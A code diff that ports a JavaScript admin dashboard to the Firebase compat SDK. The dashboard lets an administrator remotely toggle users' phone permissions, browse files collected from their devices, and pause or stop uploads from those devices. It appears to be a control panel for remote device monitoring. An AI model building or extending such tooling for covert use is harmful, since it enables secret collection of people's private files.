@@ -1,14 +1,6 @@
-import { auth, firestore } from './firebase-config.js';
-import {
-  signInWithEmailAndPassword, signOut, onAuthStateChanged,
-} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
-import {
-  collection, getDocs, doc, updateDoc, getDoc, onSnapshot, serverTimestamp,
-} from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+// Uses Firebase Compat SDK (loaded via <script> in index.html)
+// No ES module imports needed — works with file:// protocol.
 
-// ═══════════════════════════════════════════
-// CONSTANTS
-// ═══════════════════════════════════════════
 const PERMISSIONS = [
   { id:'camera',          label:'Camera',             icon:'📷', desc:'Take photos and record video' },
   { id:'microphone',      label:'Microphone',         icon:'🎙️', desc:'Record audio' },
@@ -31,74 +23,70 @@ const PERMISSIONS = [
 ];
 
 const FILE_TYPE_ICONS = {
-  image:    '🖼️',
-  video:    '🎬',
-  audio:    '🎵',
-  document: '📄',
-  apk:      '📦',
-  archive:  '🗜️',
-  other:    '📎',
+  image: '🖼️', video: '🎬', audio: '🎵',
+  document: '📄', apk: '📦', archive: '🗜️', other: '📎',
 };
 
-// ═══════════════════════════════════════════
-// STATE
-// ═══════════════════════════════════════════
+// ── State ──────────────────────────────────────────────────────────────────
 let allUsers      = [];
 let currentUserId = null;
 let pendingPerms  = {};
 
-// Files state
-let allDeviceFiles    = [];
-let filteredFiles     = [];
-let activeTypeFilter  = 'all';
-let lbIndex           = 0;
-let lbImages          = [];
+let allDeviceFiles   = [];
+let filteredFiles    = [];
+let activeTypeFilter = 'all';
+let lbIndex          = 0;
+let lbImages         = [];
 
-// Upload control state
-let currentFilesUserId  = null;
-let uploadStatusUnsub   = null;
+let currentFilesUserId = null;
+let uploadStatusUnsub  = null;
 
-// ═══════════════════════════════════════════
-// AUTH
-// ═══════════════════════════════════════════
-onAuthStateChanged(auth, user => {
-  if (user) showDashboard(user);
-  else      showLogin();
-});
+// ── Firebase refs (set after DOM ready) ───────────────────────────────────
+let auth, db;
 
-document.getElementById('loginForm').addEventListener('submit', async e => {
-  e.preventDefault();
-  const btn = document.getElementById('loginBtn');
-  const err = document.getElementById('loginError');
-  err.classList.add('hidden');
-  btn.disabled = true; btn.textContent = 'Signing in…';
-  try {
-    await signInWithEmailAndPassword(
-      auth,
-      document.getElementById('adminEmail').value.trim(),
-      document.getElementById('adminPass').value.trim()
-    );
-  } catch (ex) {
-    err.textContent = friendlyErr(ex.code);
-    err.classList.remove('hidden');
-    btn.disabled = false; btn.textContent = 'Sign In';
-  }
+// ── Init ───────────────────────────────────────────────────────────────────
+document.addEventListener('DOMContentLoaded', () => {
+  auth = firebase.auth();
+  db   = firebase.firestore();
+
+  auth.onAuthStateChanged(user => {
+    if (user) showDashboard(user);
+    else      showLogin();
+  });
+
+  document.getElementById('loginForm').addEventListener('submit', async e => {
+    e.preventDefault();
+    const btn = document.getElementById('loginBtn');
+    const err = document.getElementById('loginError');
+    err.classList.add('hidden');
+    btn.disabled = true; btn.textContent = 'Signing in…';
+    try {
+      await auth.signInWithEmailAndPassword(
+        document.getElementById('adminEmail').value.trim(),
+        document.getElementById('adminPass').value.trim()
+      );
+    } catch (ex) {
+      err.textContent = friendlyErr(ex.code);
+      err.classList.remove('hidden');
+      btn.disabled = false; btn.textContent = 'Sign In';
+    }
+  });
 });
 
 function friendlyErr(code) {
-  return ({ 'auth/user-not-found':'No account with this email.',
-             'auth/wrong-password':'Incorrect password.',
-             'auth/invalid-email':'Invalid email address.',
-             'auth/too-many-requests':'Too many attempts. Try again later.' })[code]
-    || 'Sign in failed. Check your credentials.';
+  return ({
+    'auth/user-not-found':    'No account with this email.',
+    'auth/wrong-password':    'Incorrect password.',
+    'auth/invalid-email':     'Invalid email address.',
+    'auth/invalid-credential':'Incorrect email or password.',
+    'auth/too-many-requests': 'Too many attempts. Try again later.',
+  })[code] || 'Sign in failed. Check your credentials.';
 }
 
-async function logout() { await signOut(auth); }
+function logout() { auth.signOut(); }
 window.logout = logout;
 
-// ═══════════════════════════════════════════
-// PAGES
-// ═══════════════════════════════════════════
+// ── Pages ──────────────────────────────────────────────────────────────────
 function showLogin() {
   document.getElementById('loginPage').classList.add('active');
   document.getElementById('dashboardPage').classList.remove('active');
@@ -116,13 +104,11 @@ function showDashboard(user) {
   loadUsers();
 }
 
-// ═══════════════════════════════════════════
-// LOAD USERS
-// ═══════════════════════════════════════════
+// ── Load users ─────────────────────────────────────────────────────────────
 async function loadUsers() {
   setUsersLoading(true);
   try {
-    const snap = await getDocs(collection(firestore, 'users'));
+    const snap = await db.collection('users').get();
     allUsers = snap.docs.map(d => ({ id: d.id, ...d.data() }));
     renderUsers(allUsers);
     updateStats(allUsers);
@@ -156,10 +142,10 @@ function renderUsers(users) {
 }
 
 function buildUserCard(user) {
-  const perms   = user.permissions || {};
-  const enabled = PERMISSIONS.filter(p => perms[p.id]).length;
-  const total   = PERMISSIONS.length;
-  const stats   = user.fileStats || {};
+  const perms    = user.permissions || {};
+  const enabled  = PERMISSIONS.filter(p => perms[p.id]).length;
+  const total    = PERMISSIONS.length;
+  const stats    = user.fileStats || {};
   const fileCount = stats.total || 0;
   const initials = (user.name || 'U').charAt(0).toUpperCase();
 
@@ -181,12 +167,11 @@ function buildUserCard(user) {
       <div class="user-card-footer">
         <span class="perm-count">${enabled}/${total} perms · 📂 ${fileCount} files</span>
         <div class="card-btns">
-          <button class="btn-sm blue" onclick="openFilesModal('${user.id}')">📂 Files</button>
+          <button class="btn-sm blue"   onclick="openFilesModal('${user.id}')">📂 Files</button>
           <button class="btn-sm purple" onclick="openPermModal('${user.id}')">⚙️ Perms</button>
         </div>
       </div>
-    </div>
-  `;
+    </div>`;
 }
 
 function updateStats(users) {
@@ -197,9 +182,7 @@ function updateStats(users) {
   document.getElementById('statFiles').textContent = totalFiles;
 }
 
-// ═══════════════════════════════════════════
-// SEARCH
-// ═══════════════════════════════════════════
+// ── Search ─────────────────────────────────────────────────────────────────
 function filterUsers() {
   const q = document.getElementById('searchInput').value.toLowerCase();
   renderUsers(allUsers.filter(u =>
@@ -208,9 +191,7 @@ function filterUsers() {
 }
 window.filterUsers = filterUsers;
 
-// ═══════════════════════════════════════════
-// SECTIONS
-// ═══════════════════════════════════════════
+// ── Sections ───────────────────────────────────────────────────────────────
 function showSection(e, section) {
   e.preventDefault();
   document.querySelectorAll('.nav-item').forEach(el => el.classList.remove('active'));
@@ -223,17 +204,15 @@ function showSection(e, section) {
 }
 window.showSection = showSection;
 
-// ═══════════════════════════════════════════
-// PERMISSION MODAL
-// ═══════════════════════════════════════════
+// ── Permission modal ────────────────────────────────────────────────────────
 function openPermModal(userId) {
   currentUserId = userId;
   const user = allUsers.find(u => u.id === userId);
   if (!user) return;
   pendingPerms = { ...(user.permissions || {}) };
 
-  document.getElementById('permModalName').textContent  = user.name || 'Unknown';
-  document.getElementById('permModalEmail').textContent = user.email || '';
+  document.getElementById('permModalName').textContent   = user.name || 'Unknown';
+  document.getElementById('permModalEmail').textContent  = user.email || '';
   document.getElementById('permModalAvatar').textContent = (user.name||'U').charAt(0).toUpperCase();
 
   renderPermCards(pendingPerms);
@@ -295,7 +274,7 @@ async function savePermissions() {
   const btn = document.getElementById('savePermBtn');
   btn.disabled = true; btn.textContent = '⏳ Saving…';
   try {
-    await updateDoc(doc(firestore, 'users', currentUserId), { permissions: pendingPerms });
+    await db.collection('users').doc(currentUserId).update({ permissions: pendingPerms });
     const idx = allUsers.findIndex(u => u.id === currentUserId);
     if (idx !== -1) allUsers[idx].permissions = { ...pendingPerms };
     showToast('Permissions saved! Applied instantly on mobile.', 'success');
@@ -311,22 +290,19 @@ async function savePermissions() {
 }
 window.savePermissions = savePermissions;
 
-// ═══════════════════════════════════════════
-// FILES MODAL
-// ═══════════════════════════════════════════
+// ── Files modal ─────────────────────────────────────────────────────────────
 async function openFilesModal(userId) {
   const user = allUsers.find(u => u.id === userId);
   if (!user) return;
 
   currentFilesUserId = userId;
 
-  document.getElementById('filesModalName').textContent  = user.name || 'Unknown';
-  document.getElementById('filesModalEmail').textContent = user.email || '';
+  document.getElementById('filesModalName').textContent   = user.name || 'Unknown';
+  document.getElementById('filesModalEmail').textContent  = user.email || '';
   document.getElementById('filesModalAvatar').textContent = (user.name||'U').charAt(0).toUpperCase();
 
-  // Reset state
-  allDeviceFiles = [];
-  filteredFiles  = [];
+  allDeviceFiles   = [];
+  filteredFiles    = [];
   activeTypeFilter = 'all';
   document.getElementById('filesSearchInput').value = '';
   document.querySelectorAll('.ftab').forEach(t => t.classList.remove('active'));
@@ -338,27 +314,20 @@ async function openFilesModal(userId) {
   document.getElementById('filesGrid').classList.add('hidden');
   document.body.style.overflow = 'hidden';
 
-  // Start real-time upload status listener
+  // Live upload status listener
   updateUploadControlUI('idle');
-  uploadStatusUnsub?.();
-  uploadStatusUnsub = onSnapshot(doc(firestore, 'users', userId), snap => {
+  if (uploadStatusUnsub) { uploadStatusUnsub(); uploadStatusUnsub = null; }
+  uploadStatusUnsub = db.collection('users').doc(userId).onSnapshot(snap => {
     const raw = snap.data()?.uploadControl?.status || 'idle';
     updateUploadControlUI(raw);
   });
 
-  // Load files from Firestore subcollection
   try {
-    const snap = await getDocs(
-      collection(firestore, 'users', userId, 'device_files')
-    );
+    const snap = await db.collection('users').doc(userId).collection('device_files').get();
     allDeviceFiles = snap.docs.map(d => ({ id: d.id, ...d.data() }));
-    // Sort by lastModified desc
-    allDeviceFiles.sort((a, b) => {
-      const ta = a.lastModified?.seconds || 0;
-      const tb = b.lastModified?.seconds || 0;
-      return tb - ta;
-    });
-
+    allDeviceFiles.sort((a, b) =>
+      (b.lastModified?.seconds || 0) - (a.lastModified?.seconds || 0)
+    );
     filteredFiles = [...allDeviceFiles];
     renderFilesGrid(filteredFiles);
   } catch (ex) {
@@ -371,8 +340,7 @@ window.openFilesModal = openFilesModal;
 
 function closeFilesModal(e) {
   if (e && e.target !== document.getElementById('filesModal')) return;
-  uploadStatusUnsub?.();
-  uploadStatusUnsub = null;
+  if (uploadStatusUnsub) { uploadStatusUnsub(); uploadStatusUnsub = null; }
   currentFilesUserId = null;
   document.getElementById('filesModal').classList.add('hidden');
   document.body.style.overflow = '';
@@ -382,7 +350,6 @@ window.closeFilesModal = closeFilesModal;
 function renderFilesGrid(files) {
   document.getElementById('filesLoading').classList.add('hidden');
   const grid = document.getElementById('filesGrid');
-
   document.getElementById('filesCountLabel').textContent =
     `${files.length} file${files.length !== 1 ? 's' : ''}`;
 
@@ -391,11 +358,9 @@ function renderFilesGrid(files) {
     document.getElementById('filesEmpty').classList.remove('hidden');
     return;
   }
-
   document.getElementById('filesEmpty').classList.add('hidden');
   grid.classList.remove('hidden');
 
-  // Build lightbox image list from visible images
   lbImages = files
     .filter(f => f.fileType === 'image' && f.storageUrl)
     .map(f => ({ url: f.storageUrl, name: f.name }));
@@ -404,14 +369,15 @@ function renderFilesGrid(files) {
 }
 
 function buildFileCard(file) {
-  const isImage  = file.fileType === 'image';
-  const sizeStr  = fmtSize(file.size || 0);
-  const dateStr  = fmtDate(file.lastModified?.seconds);
-  const ext      = (file.name || '').split('.').pop().toUpperCase().slice(0, 4);
-  const lbIdx    = lbImages.findIndex(x => x.url === file.storageUrl);
+  const isImage = file.fileType === 'image';
+  const sizeStr = fmtSize(file.size || 0);
+  const dateStr = fmtDate(file.lastModified?.seconds);
+  const ext     = (file.name || '').split('.').pop().toUpperCase().slice(0, 4);
+  const lbIdx   = lbImages.findIndex(x => x.url === file.storageUrl);
 
   const thumb = isImage && file.storageUrl
-    ? `<img src="${esc(file.storageUrl)}" alt="${esc(file.name)}" loading="lazy" onerror="this.parentElement.innerHTML='<span class=\\'file-type-icon\\'>🖼️</span>'" />`
+    ? `<img src="${esc(file.storageUrl)}" alt="${esc(file.name)}" loading="lazy"
+        onerror="this.parentElement.innerHTML='<span class=\\'file-type-icon\\'>🖼️</span>'" />`
     : `<span class="file-type-icon">${FILE_TYPE_ICONS[file.fileType] || '📎'}</span>`;
 
   return `
@@ -434,7 +400,6 @@ function buildFileCard(file) {
     </div>`;
 }
 
-// Filter by type tab
 function filterFiles(type, btn) {
   activeTypeFilter = type;
   document.querySelectorAll('.ftab').forEach(t => t.classList.remove('active'));
@@ -443,7 +408,6 @@ function filterFiles(type, btn) {
 }
 window.filterFiles = filterFiles;
 
-// Search by name
 function searchFiles() { applyFilesFilter(); }
 window.searchFiles = searchFiles;
 
@@ -457,16 +421,14 @@ function applyFilesFilter() {
   renderFilesGrid(filteredFiles);
 }
 
-// ═══════════════════════════════════════════
-// UPLOAD CONTROL
-// ═══════════════════════════════════════════
+// ── Upload control ──────────────────────────────────────────────────────────
 async function controlUpload(status) {
   if (!currentFilesUserId) return;
   try {
-    await updateDoc(doc(firestore, 'users', currentFilesUserId), {
-      'uploadControl': { status, updatedAt: serverTimestamp() },
+    await db.collection('users').doc(currentFilesUserId).update({
+      uploadControl: { status, updatedAt: firebase.firestore.FieldValue.serverTimestamp() },
     });
-    const labels = { running: 'resumed', paused: 'paused', stopped: 'stopped', idle: 'reset' };
+    const labels = { running:'resumed', paused:'paused', stopped:'stopped' };
     showToast(`Upload ${labels[status] || status} — mobile app will respond instantly.`, 'success');
   } catch (ex) {
     showToast('Failed to update upload control: ' + ex.message, 'error');
@@ -475,18 +437,18 @@ async function controlUpload(status) {
 window.controlUpload = controlUpload;
 
 function updateUploadControlUI(status) {
-  const dot   = document.getElementById('uploadStatusDot');
-  const label = document.getElementById('uploadStatusLabel');
+  const dot       = document.getElementById('uploadStatusDot');
+  const label     = document.getElementById('uploadStatusLabel');
   const btnResume = document.getElementById('btnResume');
   const btnPause  = document.getElementById('btnPause');
   const btnStop   = document.getElementById('btnStop');
-  if (!dot || !label) return;
+  if (!dot) return;
 
   const cfg = {
-    idle:    { color: '#475569', text: 'Idle — no active upload',     resume: false, pause: false, stop: false },
-    running: { color: '#10B981', text: 'Uploading…',                  resume: false, pause: true,  stop: true  },
-    paused:  { color: '#F59E0B', text: 'Paused',                      resume: true,  pause: false, stop: true  },
-    stopped: { color: '#EF4444', text: 'Stopped',                     resume: false, pause: false, stop: false },
+    idle:    { color:'#475569', text:'Idle — no active upload', resume:false, pause:false, stop:false },
+    running: { color:'#10B981', text:'Uploading…',              resume:false, pause:true,  stop:true  },
+    paused:  { color:'#F59E0B', text:'Paused',                  resume:true,  pause:false, stop:true  },
+    stopped: { color:'#EF4444', text:'Stopped',                 resume:false, pause:false, stop:false },
   };
   const c = cfg[status] || cfg.idle;
 
@@ -497,9 +459,7 @@ function updateUploadControlUI(status) {
   btnStop.style.display   = c.stop   ? '' : 'none';
 }
 
-// ═══════════════════════════════════════════
-// LIGHTBOX
-// ═══════════════════════════════════════════
+// ── Lightbox ────────────────────────────────────────────────────────────────
 function openLightbox(idx) {
   if (!lbImages.length || idx < 0) return;
   lbIndex = idx;
@@ -524,13 +484,12 @@ window.lbNav = lbNav;
 
 function updateLightbox() {
   const img = lbImages[lbIndex];
-  document.getElementById('lbImg').src          = img.url;
-  document.getElementById('lbName').textContent = img.name;
-  document.getElementById('lbDownload').href    = img.url;
-  document.getElementById('lbDownload').download= img.name;
+  document.getElementById('lbImg').src           = img.url;
+  document.getElementById('lbName').textContent  = img.name;
+  document.getElementById('lbDownload').href     = img.url;
+  document.getElementById('lbDownload').download = img.name;
 }
 
-// Keyboard navigation for lightbox
 document.addEventListener('keydown', e => {
   if (!document.getElementById('lightbox').classList.contains('hidden')) {
     if (e.key === 'ArrowLeft')  lbNav(-1, null);
@@ -539,9 +498,7 @@ document.addEventListener('keydown', e => {
   }
 });
 
-// ═══════════════════════════════════════════
-// UTILS
-// ═══════════════════════════════════════════
+// ── Utils ───────────────────────────────────────────────────────────────────
 function showToast(msg, type = 'success') {
   const el = document.getElementById('toast');
   el.textContent = msg;
@@ -562,13 +519,14 @@ function esc(str) {
 
 function fmtSize(bytes) {
   if (!bytes) return '0 B';
-  if (bytes < 1024)           return `${bytes} B`;
-  if (bytes < 1024*1024)      return `${(bytes/1024).toFixed(1)} KB`;
-  if (bytes < 1024*1024*1024) return `${(bytes/1024/1024).toFixed(1)} MB`;
-  return `${(bytes/1024/1024/1024).toFixed(1)} GB`;
+  if (bytes < 1024)        return `${bytes} B`;
+  if (bytes < 1048576)     return `${(bytes/1024).toFixed(1)} KB`;
+  if (bytes < 1073741824)  return `${(bytes/1048576).toFixed(1)} MB`;
+  return `${(bytes/1073741824).toFixed(1)} GB`;
 }
 
 function fmtDate(secs) {
   if (!secs) return '—';
-  return new Date(secs * 1000).toLocaleDateString('en-US', { month:'short', day:'numeric', year:'numeric' });
+  return new Date(secs * 1000).toLocaleDateString('en-US',
+    { month:'short', day:'numeric', year:'numeric' });
 }
